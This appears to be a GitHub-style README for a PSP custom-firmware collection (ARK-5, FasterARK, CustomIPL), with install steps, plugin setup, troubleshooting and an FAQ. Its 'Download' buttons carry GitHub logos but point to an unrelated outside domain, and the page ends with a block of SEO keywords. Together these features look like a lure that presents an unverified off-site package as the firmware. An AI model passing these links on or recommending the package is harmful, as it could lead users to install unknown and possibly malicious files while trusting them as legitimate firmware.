
# Sony PSP Custom Firmware & Homebrew

<p align="center">
  <img src="https://img.shields.io/badge/Platform-PlayStation%20Portable-003791?style=for-the-badge&logo=playstation" alt="PlayStation Portable"/>
  <img src="https://img.shields.io/badge/CFW-ARK--5-blue?style=for-the-badge" alt="ARK-5 Custom Firmware"/>
  <img src="https://img.shields.io/badge/Firmware-6.60%20%7C%206.61-green?style=for-the-badge" alt="PSP Firmware"/>
  <img src="https://img.shields.io/badge/Category-Custom%20Firmware-orange?style=for-the-badge" alt="Custom Firmware"/>
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-PSP%20Firmware%20Package-blue?style=for-the-badge&logo=github" alt="Download PSP Firmware Package"/></a>
</p>

## Overview

PSP Custom Firmware & Homebrew is a community-oriented collection of custom firmware, installation utilities, plugins, recovery tools, and homebrew resources for the Sony PlayStation Portable.

The project focuses on the modern ARK-5 custom firmware ecosystem and related PSP software, including FasterARK, CustomIPL, legacy ARK-4, PRO, and ME firmware environments.

Custom firmware extends the functionality of the original PSP system software by enabling compatible homebrew applications, plugins, additional configuration options, and alternative game-loading features.

The collection covers PSP-1000, PSP-2000, PSP-3000, PSP Go, and PSP Street models, subject to firmware and hardware compatibility.

This repository is an independent software resource. It is not an official Sony firmware distribution and does not replace the original PSP hardware.

## Key Features

- **ARK-5 CFW:** Current successor to ARK-4 and a modern custom firmware environment for PSP.
- **FasterARK:** Installer and updater for ARK-5.
- **CustomIPL:** Boot-time installation utility for compatible permanent CFW configurations.
- **Live CFW:** Temporary custom firmware operation without permanent IPL modification.
- **Plugin Support:** Compatible system, game, and application plugins.
- **Custom Launcher:** Alternative interface for managing games, files, plugins, and settings.
- **ISO Driver:** Inferno-based game image loading support.
- **Homebrew Support:** Execution of compatible unsigned PSP applications.
- **PS1 Compatibility:** Support for compatible PlayStation 1 content through the PSP software environment.
- **Overclocking:** CPU and bus clock configuration on supported PSP hardware.
- **Recovery Tools:** Utilities for system maintenance and supported recovery workflows.
- **Legacy CFW Compatibility:** Resources for PRO, ME, and ARK-4 installations and migration.

## Technical Specifications

| Component | PSP-1000 | PSP-2000 / 3000 | PSP Go / Street |
|---|---|---|---|
| CPU | MIPS R4000-based Allegrex | MIPS R4000-based Allegrex | MIPS R4000-based Allegrex |
| CPU Clock | Up to 333 MHz | Up to 333 MHz | Up to 333 MHz |
| RAM | 32 MB | 64 MB | 64 MB |
| Display Resolution | 480 × 272 | 480 × 272 | 480 × 272 |
| Display Size | 4.3 inches | 4.3 inches | 3.8 inches on Go; 4.3 inches on Street |
| Storage | Memory Stick PRO Duo | Memory Stick PRO Duo | Internal storage and Memory Stick Micro on Go |
| Optical Drive | UMD | UMD | No UMD drive |
| Operating System | PSP System Software | PSP System Software | PSP System Software |

PSP Street does not include wireless networking. Hardware features and storage options vary by model.

## Compatibility

### Supported PSP Models

| Model | CFW Compatibility | Notes |
|---|---|---|
| PSP-1000 | Supported | 32 MB RAM; legacy homebrew compatibility |
| PSP-2000 | Supported | Hardware revision affects IPL options |
| PSP-3000 | Supported | Use the model-appropriate installation method |
| PSP Go (N1000) | Supported | Internal storage and Memory Stick Micro |
| PSP Street (E1000) | Supported | No Wi-Fi; model-specific boot considerations |

ARK-5 is designed for broad PSP model compatibility. The exact permanent installation method depends on the console's hardware and IPL characteristics.

### Firmware Compatibility

| Official Firmware | ARK-5 Installation |
|---|---|
| 6.60 | Supported |
| 6.61 | Supported |
| 6.60 Test / Development Tool firmware | Supported in documented configurations |
| Older firmware | Update to a supported baseline before following the current installation guide |

For a fresh installation, the current FasterARK instructions specify official firmware 6.60 or 6.61. Do not assume that every legacy CFW installer or permanent IPL method is interchangeable.

### CFW Types

| Firmware | Description |
|---|---|
| ARK-5 | Current successor to ARK-4 |
| ARK-4 | Previous ARK generation; legacy installation and migration support |
| PRO | Established PSP custom firmware family |
| ME / LME | Established custom firmware family with legacy plugin and system features |

For new installations, ARK-5 is the primary focus of this collection. Legacy CFW packages are included for reference and compatibility workflows.

## Firmware Features

### ARK-5 Custom Firmware

ARK-5 is the next-generation continuation of the ARK custom firmware project.

Its documented features include:

- Homebrew and plugin support.
- Updated PSPSDK-based development.
- Improved plugin management in the XMB.
- Custom launcher functionality.
- Enhanced memory management on models with additional RAM.
- CPU overclocking on PSP hardware.
- ISO loading through the Inferno driver.
- PSP and PS1 software compatibility features.
- Configuration and recovery options.

ARK-5 is a custom firmware environment, not an official Sony system software release.

### FasterARK

FasterARK is the installer and updater used to deploy ARK-5.

It provides installation packages for PSP and PS Vita ePSP environments. On a physical PSP, the installer prepares the required ARK files and launches the CFW installation process.

FasterARK includes different package variants, such as Full and Lite. Their included utilities and optional components differ.

### CustomIPL

CustomIPL provides a boot-time installation path for supported PSP hardware.

A compatible permanent installation allows ARK-5 to load automatically during startup rather than requiring the user to launch the temporary CFW loader after every full shutdown.

Permanent IPL modification is a higher-risk operation than temporary CFW. Use only the installer version and procedure intended for the exact PSP model.

### Temporary and Permanent CFW

**Temporary / Live CFW**

- Does not require a permanent IPL patch.
- Must generally be launched again after a full shutdown.
- Useful for testing compatibility before making persistent changes.

**Permanent CFW**

- Uses a supported boot-time IPL installation method.
- Starts the custom firmware during normal startup.
- Requires careful model-specific compatibility checks.
- Carries additional risk if installation is interrupted or the wrong IPL method is used.

### Plugin Framework

ARK-5 supports compatible PSP plugins.

Plugins can extend:

- XMB functionality.
- Game behavior.
- System configuration.
- Application features.
- Performance and display options.

Plugin compatibility depends on the firmware, plugin version, and execution environment.

## System Requirements

### Hardware

- Compatible Sony PSP console.
- Functional battery and power adapter.
- Memory Stick PRO Duo, Memory Stick Micro, or supported internal storage configuration.
- USB cable or compatible memory card reader.
- Computer for preparing installation files.

### Software

- Official PSP firmware 6.60 or 6.61 for the documented fresh installation workflow.
- Compatible FasterARK package.
- CustomIPL utility when a permanent installation is intended.
- Sufficient free storage for installation files and backups.
- Compatible homebrew applications and plugins.

Before installation, confirm the console model and current system software version under:

**Settings → System Settings → System Information**

## Download & Installation

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-ARK%20PSP%20Package-blue?style=for-the-badge&logo=github" alt="Download ARK PSP Package"/></a>
</p>

### Fresh Installation on Official Firmware

The current FasterARK workflow uses official firmware 6.60 or 6.61.

1. Identify the PSP model.
2. Check the installed system software version.
3. If necessary, update to official firmware 6.60 or 6.61 using a compatible update package.
4. Download the appropriate FasterARK PSP package.
5. Extract the archive on a computer.
6. Copy the extracted PSP folder structure to the root of the Memory Stick or supported PSP Go storage.
7. Safely disconnect the PSP from USB mode.
8. Open the Game menu on the PSP.
9. Launch FasterARK and allow the installation process to complete.
10. Verify that ARK-5 starts correctly.

### Optional Permanent Installation

If permanent CFW is desired:

1. Confirm that the selected CustomIPL method supports the exact PSP model.
2. Back up important Memory Stick data.
3. Ensure the battery is adequately charged and connect external power where appropriate.
4. Launch the compatible CustomIPL utility supplied by the installation package.
5. Follow the model-specific installation instructions.
6. Allow the installation process to finish without interruption.
7. Restart the PSP and verify that the CFW loads correctly.

Do not install a permanent IPL modification simply because the installer is available. Confirm hardware compatibility first.

### Updating an Existing ARK Installation

For supported ARK-4 installations:

1. Check the installed ARK version.
2. Use the built-in OTA update feature when available.
3. If OTA updating is unavailable, follow the FasterARK migration instructions.
4. Use the appropriate update package and preserve required configuration files.
5. Restart the console and verify the new CFW version.

### Common File Locations

| Path | Purpose |
|---|---|
| `/PSP/GAME/` | Homebrew applications and installers |
| `/PSP/SAVEDATA/` | Application data and savedata |
| `/ISO/` | Game image storage for compatible loaders |
| `/SEPLUGINS/` | Plugin files and configuration |
| `ms0:/` | Memory Stick storage |
| `ef0:/` | PSP Go internal storage |

Directory requirements can vary by application and storage configuration.

## Configuration & Management

### ARK Custom Launcher

The ARK custom launcher provides an alternative interface for managing PSP content.

Its documented functions include:

- Game manager.
- File manager.
- Network manager.
- Plugin manager.
- Custom firmware settings.
- Launcher configuration.
- Update checking.
- Shutdown and reboot options.

The launcher is particularly useful when the standard XMB is unavailable or when additional management features are required.

### Plugin Configuration

ARK supports plugin configuration through its plugin management system.

When installing plugins:

1. Check the plugin's compatibility with ARK-5.
2. Copy the plugin file to the appropriate storage directory.
3. Add the correct configuration entry.
4. Enable the plugin only in the required execution environment.
5. Restart the relevant application or system.
6. Test the plugin before adding additional extensions.

Typical execution categories include:

- `game` — PSP games.
- `vsh` — XMB interface.
- `pops` — PS1 software environment.

Do not enable multiple plugins that modify the same system function without checking for conflicts.

### CPU and Power Settings

ARK firmware provides clock configuration options.

Common operating modes include:

- Default clock behavior.
- Balanced clock speed.
- Power-saving clock settings.
- Higher CPU clock configurations.

Overclocking can increase power consumption and heat. Use settings appropriate for the console's condition and cooling capability.

### Storage Management

For Memory Stick and PSP Go storage:

- Keep installation files separate from personal content.
- Back up important savedata.
- Verify available storage before installing applications.
- Avoid removing storage while the PSP is writing data.
- Maintain a copy of working plugin configuration files.

## Troubleshooting

| Issue | Possible Cause | Recommended Action |
|---|---|---|
| FasterARK does not appear | Incorrect directory structure | Verify files are copied to the correct storage root |
| FasterARK crashes | Unsupported firmware or incomplete package | Check the firmware version and package variant |
| ARK does not start after reboot | Temporary CFW installation | Relaunch the loader or use a supported permanent method |
| CustomIPL installation fails | Incompatible model or IPL method | Verify hardware revision and installer requirements |
| PSP freezes during startup | Plugin conflict or configuration error | Disable recently added plugins using a supported recovery method |
| Homebrew application does not launch | Incompatible EBOOT or missing dependency | Check the application requirements |
| Plugin is not detected | Incorrect path or configuration entry | Verify plugin location and execution category |
| Game image does not appear | Incorrect storage path or unsupported format | Check the loader and directory configuration |
| PSP reports insufficient storage | Memory Stick or internal storage is full | Free space and retry |
| Update process fails | Incomplete files or unsupported update path | Recheck package integrity and follow the official project guide |
| PSP displays corrupted data | Incorrect application directory structure | Verify the folder contains the expected executable files |
| System becomes unstable | Conflicting plugins or unsafe settings | Restore a known-good configuration |

## FAQ

### 1. What is PSP custom firmware?

PSP custom firmware is modified system software that adds homebrew execution, plugin support, additional configuration options, and other community-developed features to the PlayStation Portable.

### 2. What is the current ARK firmware generation?

ARK-5 is the successor to ARK-4 and is the current ARK development line covered by this repository.

### 3. What is the difference between ARK-5 and ARK-4?

ARK-5 continues the ARK project with an updated development toolchain, improved plugin management, memory improvements, and other under-the-hood changes. ARK-4 is the previous generation.

### 4. Which PSP models are supported?

The ARK ecosystem supports PSP-1000, PSP-2000, PSP-3000, PSP Go, and PSP Street, subject to the specific installation method and hardware limitations.

### 5. Do I need firmware 6.61?

The documented fresh FasterARK installation workflow supports official firmware 6.60 and 6.61. Check the current installation guide before updating or downgrading a console.

### 6. What is FasterARK?

FasterARK is the installer and updater used to deploy ARK-5 on supported PSP and PS Vita ePSP configurations.

### 7. Is permanent CFW required?

No. ARK can run as temporary or Live CFW. A compatible permanent IPL installation is optional and allows the CFW to load automatically during startup.

### 8. What is CustomIPL?

CustomIPL is a utility for installing a compatible custom boot process. It enables persistent CFW on supported PSP configurations.

### 9. Can I use PSP plugins with ARK-5?

Yes. ARK-5 supports compatible plugins. Individual plugins may require specific firmware versions or execution categories.

### 10. Can ARK-5 run homebrew applications?

Yes. ARK-5 supports compatible unsigned PSP applications and homebrew software.

### 11. Can I use ARK-5 on a PS Vita?

ARK-5 also supports the PSP emulator environment on PS Vita through compatible installation methods. That setup is separate from installing CFW on original PSP hardware.

### 12. Is this project affiliated with Sony?

No. This is an independent community-oriented project and is not affiliated with, sponsored by, or endorsed by Sony Interactive Entertainment.

## SEO Keywords

PSP Custom Firmware, PSP CFW, ARK-5, ARK-4, PlayStation Portable, PSP Firmware 6.61, PSP Firmware 6.60, PSP Homebrew, PSP Jailbreak, PSP CustomIPL, FasterARK, PSP Permanent CFW, PSP Temporary CFW, PSP Plugins, PSP Plugin Manager, PSP Recovery Tools, PSP ISO Driver, Inferno Driver, PSP Homebrew Applications, PSP Custom Launcher, PSP Overclocking, PSP System Software, PSP-1000, PSP-2000, PSP-3000, PSP Go, PSP Street, PRO CFW, ME CFW, LME CFW, PSP Modding, PSP Development, PSP Utilities, Sony PSP Community
